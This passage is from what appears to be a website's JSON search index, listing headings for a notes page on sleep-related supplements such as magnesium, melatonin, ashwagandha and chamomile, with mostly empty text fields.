l-theanine</p>"},{"location":"self-improvement/nutrition/supplements/#magnesium","title":"magnesium","text":""},{"location":"self-improvement/nutrition/supplements/#melatonin","title":"melatonin","text":""},{"location":"self-improvement/nutrition/supplements/#ashwagandha","title":"ashwagandha","text":""},{"location":"self-improvement/nutrition/supplements/#taurine","title":"taurine","text":""},{"location":"self-improvement/nutrition/supplements/#gaba","title":"GABA","text":""},{"location":"self-improvement/nutrition/supplements/#tart-cherry-juice","title":"tart cherry juice","text":""},{"location":"self-improvement/nutrition/supplements/#apigenin","title":"apigenin","text":""},{"location":"self-improvement/nutrition/supplements/#valerian-root","title":"valerian root","text":""},{"location":"self-improvement/nutrition/supplements/#l-theanine","title":"l-theanine","text":""},{"location":"self-improvement/nutrition/supplements/#chamomile","title":"chamomile","text":""},{"location":"self-improvement/nutrition/supplements/#badnot-effective","title":"bad/not effective","text":""}]}